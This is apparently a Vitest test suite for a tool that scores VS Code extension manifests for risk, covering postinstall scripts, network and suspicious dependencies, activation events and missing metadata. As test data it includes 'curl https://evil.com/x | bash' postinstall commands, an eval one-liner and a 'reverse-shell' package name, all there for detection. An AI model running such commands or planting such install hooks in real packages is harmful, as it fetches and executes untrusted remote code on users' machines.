import { describe, it, expect } from "vitest"
import { getDefaultRules, loadCustomRules } from "../src/rules.js"
import type { ExtensionManifest, Finding, RiskRule, RuleCategory, Severity } from "../src/types.js"
import * as fs from "fs"
import * as path from "path"

/* ------------------------------------------------------------------ */
/* Helper factories                                                   */
/* ------------------------------------------------------------------ */

const FIXTURES = path.resolve(__dirname, "..", "fixtures", "extensions")

/** Build a minimal manifest — all fields optional except raw/path/name/version/directory */
function makeManifest(
  overrides: Partial<ExtensionManifest> & { baseDirOverride?: string },
  extraRaw?: Record<string, unknown>,
): ExtensionManifest {
  const baseDir = overrides.baseDirOverride ?? "/tmp/fake-ext"
  const rawBase: Record<string, unknown> = {
    name: "test-ext",
    version: "1.0.0",
    engines: { vscode: "^1.80.0" },
    ...extraRaw,
  }
  return {
    raw: { ...rawBase, ...overrides.raw },
    path: path.join(baseDir, "package.json"),
    name: overrides.name ?? rawBase.name as string,
    version: overrides.version ?? "1.0.0",
    publisher: overrides.publisher,
    displayName: overrides.displayName,
    description: overrides.description,
    activationEvents: overrides.activationEvents,
    main: overrides.main,
    scripts: overrides.scripts,
    dependencies: overrides.dependencies,
    devDependencies: overrides.devDependencies,
    extensionKind: overrides.extensionKind,
    capabilities: overrides.capabilities,
    directory: baseDir,
    ...overrides,
  }
}

/** Collect findings from a single manifest against given rules (with optional filter) */
function runRules(m: ExtensionManifest, ruleIds?: string[]): Finding[] {
  const rules = getDefaultRules()
  const subset = ruleIds ? rules.filter((r) => ruleIds.includes(r.id)) : rules
  return subset.map((r) => r.check(m)).filter(Boolean) as Finding[]
}

/* ------------------------------------------------------------------ */
/* 0. Rule inventory check                                            */
/* ------------------------------------------------------------------ */

describe("rule inventory", () => {
  const rules = getDefaultRules()

  it("exports exactly 14 rules", () => {
    expect(rules).toHaveLength(14)
  })

  it("every rule has a unique id", () => {
    const ids = rules.map((r) => r.id)
    expect(new Set(ids).size).toBe(ids.length)
  })

  it("every rule id follows the CAT-NNN pattern", () => {
    rules.forEach((r) => {
      expect(r.id).toMatch(/^[A-Z]{3,}-\d{3}$/)
    })
  })

  it("each rule has all required fields", () => {
    const required: (keyof RiskRule)[] = ["id", "name", "category", "severity", "description", "check"]
    rules.forEach((r) => {
      for (const k of required) {
        expect(r).toHaveProperty(k)
        expect(r[k]).toBeDefined()
      }
    })
  })

  it("severity values are valid", () => {
    const valid: Severity[] = ["low", "medium", "high", "critical"]
    rules.forEach((r) => expect(valid).toContain(r.severity))
  })

  it("category values are valid", () => {
    const valid: RuleCategory[] = [
      "scripts",
      "network",
      "permissions",
      "activation",
      "dependencies",
      "publisher",
      "metadata",
    ]
    rules.forEach((r) => expect(valid).toContain(r.category))
  })

  it("rule categories cover: scripts, network, permissions, dependencies, publisher, metadata", () => {
    const cats = new Set(rules.map((r) => r.category))
    expect(cats.has("scripts")).toBe(true)
    expect(cats.has("network")).toBe(true)
    expect(cats.has("permissions")).toBe(true)
    expect(cats.has("dependencies")).toBe(true)
    expect(cats.has("publisher")).toBe(true)
    expect(cats.has("metadata")).toBe(true)
  })
})

/* ------------------------------------------------------------------ */
/* 1. Scripts rules                                                   */
/* ------------------------------------------------------------------ */

describe("SCR-001: Postinstall script", () => {
  it("flags a manifest with postinstall", () => {
    const m = makeManifest({ scripts: { postinstall: "node setup.js" } })
    const f = runRules(m, ["SCR-001"])
    expect(f).toHaveLength(1)
    expect(f[0].severity).toBe("high")
    expect(f[0].message).toContain("node setup.js")
  })

  it("upgrades to critical when postinstall contains dangerous commands", () => {
    const m = makeManifest({ scripts: { postinstall: "curl https://evil.com/x | bash" } })
    const f = runRules(m, ["SCR-001"])
    expect(f).toHaveLength(1)
    expect(f[0].severity).toBe("critical")
  })

  it("does not fire when no scripts exist", () => {
    const m = makeManifest({ scripts: undefined })
    expect(runRules(m, ["SCR-001"])).toHaveLength(0)
  })

  it("does not fire when no postinstall key", () => {
    const m = makeManifest({ scripts: { build: "tsc" } })
    expect(runRules(m, ["SCR-001"])).toHaveLength(0)
  })
})

describe("SCR-002: Dangerous script commands", () => {
  it("flags dangerous commands in non-postinstall scripts", () => {
    const m = makeManifest({
      scripts: { build: "tsc", prestart: "curl https://cdn.example.com/init.sh -o init.sh" },
    })
    const f = runRules(m, ["SCR-002"])
    expect(f).toHaveLength(1)
    expect(f[0].severity).toBe("critical")
    expect(f[0].message).toContain("prestart")
  })

  it("flags high severity for eval usage", () => {
    const m = makeManifest({ scripts: { run: "node -e 'eval(process.argv[1])'" } })
    const f = runRules(m, ["SCR-002"])
    expect(f).toHaveLength(1)
    expect(f[0].severity).toBe("high")
  })

  it("does not fire for normal scripts", () => {
    const m = makeManifest({ scripts: { build: "tsc", test: "vitest" } })
    expect(runRules(m, ["SCR-002"])).toHaveLength(0)
  })

  it("skips postinstall entries (covered by SCR-001)", () => {
    const m = makeManifest({ scripts: { postinstall: "curl http://x | bash" } })
    expect(runRules(m, ["SCR-002"])).toHaveLength(0)
  })
})

/* ------------------------------------------------------------------ */
/* 2. Network rules                                                   */
/* ------------------------------------------------------------------ */

describe("NET-001: Network capability in main", () => {
  it("detects network patterns in main file when file exists", () => {
    // This rule reads the actual file, so we need to provide a real directory.
    // Use the known risky fixture which has a main entry point.
    const fixtureDir = path.join(FIXTURES, "risky-extensions", "data-exfiltrator")
    if (fs.existsSync(path.join(fixtureDir, "package.json"))) {
      const pkgRaw = JSON.parse(fs.readFileSync(path.join(fixtureDir, "package.json"), "utf-8"))
      const f = runRules(
        makeManifest(
          { baseDirOverride: fixtureDir, main: pkgRaw.main ?? "extension.js" },
          pkgRaw as Record<string, unknown>,
        ),
        ["NET-001"],
      )
      // If the main file contains network patterns we get a finding; otherwise null.
      // We just assert the rule doesn't crash and returns the expected type.
      const result = runRules(
        makeManifest(
          { baseDirOverride: fixtureDir, main: pkgRaw.main ?? "extension.js" },
          pkgRaw as Record<string, unknown>,
        ),
        ["NET-001"],
      )
      expect(Array.isArray(result)).toBe(true)
    }
  })

  it("returns null when main is undefined", () => {
    const m = makeManifest({ main: undefined })
    expect(runRules(m, ["NET-001"])).toHaveLength(0)
  })
})

describe("NET-002: Network dependencies", () => {
  it("flags network library dependency", () => {
    const m = makeManifest({ dependencies: { axios: "^1.6.0" } })
    const f = runRules(m, ["NET-002"])
    expect(f).toHaveLength(1)
    expect(f[0].message).toContain("axios")
  })

  it("flags multiple network deps as high severity", () => {
    const m = makeManifest({
      dependencies: { axios: "^1.6.0", "node-fetch": "^3.3.0", got: "^14.0.0" },
    })
    const f = runRules(m, ["NET-002"])
    expect(f).toHaveLength(1)
    expect(f[0].severity).toBe("high")
    expect(f[0].message).toContain("axios")
    expect(f[0].message).toContain("node-fetch")
    expect(f[0].message).toContain("got")
  })

  it("flags network deps in devDependencies too", () => {
    const m = makeManifest({ devDependencies: { undici: "^6.0.0" } })
    const f = runRules(m, ["NET-002"])
    expect(f).toHaveLength(1)
  })

  it("does not fire for non-network deps", () => {
    const m = makeManifest({ dependencies: { typescript: "^5.0.0" } })
    expect(runRules(m, ["NET-002"])).toHaveLength(0)
  })
})

/* ------------------------------------------------------------------ */
/* 3. Permissions rules                                               */
/* ------------------------------------------------------------------ */

describe("PERM-001: Wide activation events", () => {
  it("flags when many activation events present", () => {
    const m = makeManifest({
      activationEvents: [
        "onCommand:a",
        "onCommand:b",
        "onCommand:c",
        "onCommand:d",
        "onCommand:e",
      ],
    })
    const f = runRules(m, ["PERM-001"])
    expect(f).toHaveLength(1)
    expect(f[0].severity).toBe("medium")
  })

  it("flags high severity for always-on activation (*)", () => {
    const m = makeManifest({
      activationEvents: ["onCommand:a", "onCommand:b", "onCommand:c", "onCommand:d", "*"],
    })
    const f = runRules(m, ["PERM-001"])
    expect(f).toHaveLength(1)
    expect(f[0].severity).toBe("high")
    expect(f[0].message).toContain("*")
  })

  it("flags high severity for onStartupFinished", () => {
    const m = makeManifest({
      activationEvents: ["onCommand:a", "onCommand:b", "onCommand:c", "onCommand:d", "onStartupFinished"],
    })
    const f = runRules(m, ["PERM-001"])
    expect(f).toHaveLength(1)
    expect(f[0].severity).toBe("high")
  })

  it("does not fire for few activation events", () => {
    const m = makeManifest({ activationEvents: ["onCommand:ext.start"] })
    expect(runRules(m, ["PERM-001"])).toHaveLength(0)
  })
})

describe("PERM-002: Workspace trust bypass", () => {
  it("flags extensionKind ui string", () => {
    const m = makeManifest({ extensionKind: "ui" })
    const f = runRules(m, ["PERM-002"])
    expect(f).toHaveLength(1)
    expect(f[0].severity).toBe("medium")
  })

  it("flags extensionKind ui in array", () => {
    const m = makeManifest({ extensionKind: ["workspace", "ui"] })
    const f = runRules(m, ["PERM-002"])
    expect(f).toHaveLength(1)
  })

  it("does not fire for workspace-only extensionKind", () => {
    const m = makeManifest({ extensionKind: "workspace" })
    expect(runRules(m, ["PERM-002"])).toHaveLength(0)
  })
})

describe("PERM-003: File system access", () => {
  it("returns null when no main defined", () => {
    const m = makeManifest({ main: undefined })
    expect(runRules(m, ["PERM-003"])).toHaveLength(0)
  })
})

describe("PERM-004: Process spawning", () => {
  it("returns null when no main defined", () => {
    const m = makeManifest({ main: undefined })
    expect(runRules(m, ["PERM-004"])).toHaveLength(0)
  })
})

/* ------------------------------------------------------------------ */
/* 4. Dependencies rules                                              */
/* ------------------------------------------------------------------ */

describe("DEP-001: Excessive dependencies", () => {
  it("flags > 20 dependencies as low severity", () => {
    const deps: Record<string, string> = {}
    for (let i = 0; i < 25; i++) deps[`lib-${i}`] = "^1.0.0"
    const m = makeManifest({ dependencies: deps })
    const f = runRules(m, ["DEP-001"])
    expect(f).toHaveLength(1)
    expect(f[0].severity).toBe("low")
    expect(f[0].message).toContain("25")
  })

  it("flags > 50 dependencies as medium severity", () => {
    const deps: Record<string, string> = {}
    for (let i = 0; i < 55; i++) deps[`lib-${i}`] = "^1.0.0"
    const m = makeManifest({ dependencies: deps })
    const f = runRules(m, ["DEP-001"])
    expect(f).toHaveLength(1)
    expect(f[0].severity).toBe("medium")
  })

  it("does not fire for few dependencies", () => {
    const m = makeManifest({ dependencies: { typescript: "^5.0.0" } })
    expect(runRules(m, ["DEP-001"])).toHaveLength(0)
  })
})

describe("DEP-002: Crypto dependencies", () => {
  it("flags crypto-js dependency", () => {
    const m = makeManifest({ dependencies: { "crypto-js": "^4.2.0" } })
    const f = runRules(m, ["DEP-002"])
    expect(f).toHaveLength(1)
    expect(f[0].severity).toBe("medium")
    expect(f[0].message).toContain("crypto-js")
  })

  it("flags multiple crypto deps", () => {
    const m = makeManifest({ dependencies: { bcrypt: "^5.0.0", tweetnacl: "^1.0.0", "node-rsa": "^1.1.0" } })
    const f = runRules(m, ["DEP-002"])
    expect(f).toHaveLength(1)
    expect(f[0].message).toContain("bcrypt")
    expect(f[0].message).toContain("tweetnacl")
    expect(f[0].message).toContain("node-rsa")
  })

  it("does not fire for non-crypto deps", () => {
    const m = makeManifest({ dependencies: { lodash: "^4.17.0" } })
    expect(runRules(m, ["DEP-002"])).toHaveLength(0)
  })
})

describe("DEP-003: Suspicious dependencies", () => {
  it("flags javascript-obfuscator", () => {
    const m = makeManifest({ dependencies: { "javascript-obfuscator": "^4.1.0" } })
    const f = runRules(m, ["DEP-003"])
    expect(f).toHaveLength(1)
    expect(f[0].severity).toBe("high")
    expect(f[0].message).toContain("javascript-obfuscator")
  })

  it("flags vm2", () => {
    const m = makeManifest({ dependencies: { vm2: "^3.9.0" } })
    const f = runRules(m, ["DEP-003"])
    expect(f).toHaveLength(1)
  })

  it("flags pkg", () => {
    const m = makeManifest({ devDependencies: { pkg: "^5.8.0" } })
    const f = runRules(m, ["DEP-003"])
    expect(f).toHaveLength(1)
  })

  it("flags reverse-shell and base64", () => {
    const m = makeManifest({ dependencies: { "reverse-shell": "^1.0.0", base64: "^0.1.0" } })
    const f = runRules(m, ["DEP-003"])
    expect(f).toHaveLength(1)
    expect(f[0].message).toContain("reverse-shell")
    expect(f[0].message).toContain("base64")
  })

  it("does not fire for benign deps", () => {
    const m = makeManifest({ dependencies: { vscode: "^1.0.0" } })
    expect(runRules(m, ["DEP-003"])).toHaveLength(0)
  })
})

/* ------------------------------------------------------------------ */
/* 5. Publisher rules                                                 */
/* ------------------------------------------------------------------ */

describe("PUB-001: Missing publisher", () => {
  it("flags missing publisher", () => {
    const m = makeManifest({ publisher: undefined })
    const f = runRules(m, ["PUB-001"])
    expect(f).toHaveLength(1)
    expect(f[0].severity).toBe("medium")
    expect(f[0].message).toContain("No publisher")
  })

  it("does not fire when publisher is present", () => {
    const m = makeManifest({ publisher: "trusted-author" })
    expect(runRules(m, ["PUB-001"])).toHaveLength(0)
  })
})

/* ------------------------------------------------------------------ */
/* 6. Metadata rules                                                  */
/* ------------------------------------------------------------------ */

describe("META-001: Missing description", () => {
  it("flags missing description", () => {
    const m = makeManifest({ description: undefined })
    const f = runRules(m, ["META-001"])
    expect(f).toHaveLength(1)
    expect(f[0].severity).toBe("low")
    expect(f[0].message).toContain("No description")
  })

  it("does not fire when description is present", () => {
    const m = makeManifest({ description: "A great extension" })
    expect(runRules(m, ["META-001"])).toHaveLength(0)
  })
})

describe("META-002: Missing homepage/repository", () => {
  it("flags when neither homepage nor repository in raw", () => {
    const m = makeManifest(
      { raw: {} },
    )
    const f = runRules(m, ["META-002"])
    expect(f).toHaveLength(1)
    expect(f[0].severity).toBe("low")
    expect(f[0].message).toContain("No homepage or repository")
  })

  it("does not fire when homepage is present", () => {
    const m = makeManifest({ raw: { homepage: "https://example.com" } })
    expect(runRules(m, ["META-002"])).toHaveLength(0)
  })

  it("does not fire when repository is present", () => {
    const m = makeManifest({ raw: { repository: { type: "git", url: "https://github.com/x/y" } } })
    expect(runRules(m, ["META-002"])).toHaveLength(0)
  })

  it("does not fire when both present", () => {
    const m = makeManifest({
      raw: {
        homepage: "https://example.com",
        repository: { type: "git", url: "https://github.com/x/y" },
      },
    })
    expect(runRules(m, ["META-002"])).toHaveLength(0)
  })
})

/* ------------------------------------------------------------------ */
/* 7. Integration: fixture against known manifests                    */
/* ------------------------------------------------------------------ */

describe("fixture: safe extension clean-linter", () => {
  const fixtureDir = path.join(FIXTURES, "safe-extensions", "clean-linter")
  const pkgRaw = JSON.parse(fs.readFileSync(path.join(fixtureDir, "package.json"), "utf-8"))

  it("triggers no script/network/permission/dependency rules", () => {
    const m = makeManifest(
      {
        baseDirOverride: fixtureDir,
        main: pkgRaw.main ?? undefined,
        scripts: pkgRaw.scripts,
        dependencies: pkgRaw.dependencies,
        devDependencies: pkgRaw.devDependencies,
        activationEvents: pkgRaw.activationEvents,
        extensionKind: pkgRaw.extensionKind,
        publisher: typeof pkgRaw.publisher === "string" ? pkgRaw.publisher : undefined,
        description: pkgRaw.description,
      },
      pkgRaw as Record<string, unknown>,
    )
    const findings = runRules(m)
    // Should only trigger metadata-level findings at most (and this one has description/repo)
    const nonMeta = findings.filter((f) => !["publisher", "metadata"].includes(f.category))
    expect(nonMeta).toHaveLength(0)
  })
})

describe("fixture: risky extension data-exfiltrator", () => {
  const fixtureDir = path.join(FIXTURES, "risky-extensions", "data-exfiltrator")
  const pkgPath = path.join(fixtureDir, "package.json")

  it("triggers multiple high-severity findings", () => {
    if (!fs.existsSync(pkgPath)) {
      // Fixture might not exist in all environments; skip gracefully
      expect(true).toBe(true)
      return
    }
    const pkgRaw = JSON.parse(fs.readFileSync(pkgPath, "utf-8"))
    const m = makeManifest(
      {
        baseDirOverride: fixtureDir,
        main: pkgRaw.main ?? undefined,
        scripts: pkgRaw.scripts,
        dependencies: pkgRaw.dependencies,
        devDependencies: pkgRaw.devDependencies,
        activationEvents: pkgRaw.activationEvents,
        extensionKind: pkgRaw.extensionKind,
        publisher: typeof pkgRaw.publisher === "string" ? pkgRaw.publisher : undefined,
      },
      pkgRaw as Record<string, unknown>,
    )
    const findings = runRules(m)
    // Risky fixture should have at least some findings
    expect(findings.length).toBeGreaterThan(0)
    const highOrCritical = findings.filter((f) => f.severity === "high" || f.severity === "critical")
    // We expect at least one high/critical from the risky fixture
    expect(highOrCritical.length).toBeGreaterThan(0)
  })
})

/* ------------------------------------------------------------------ */
/* 8. loadCustomRules                                                 */
/* ------------------------------------------------------------------ */

describe("loadCustomRules", () => {
  it("returns empty array for non-existent file", () => {
    const result = loadCustomRules("/nonexistent/does/not/exist.json")
    expect(Array.isArray(result)).toBe(true)
    expect(result).toHaveLength(0)
  })
})
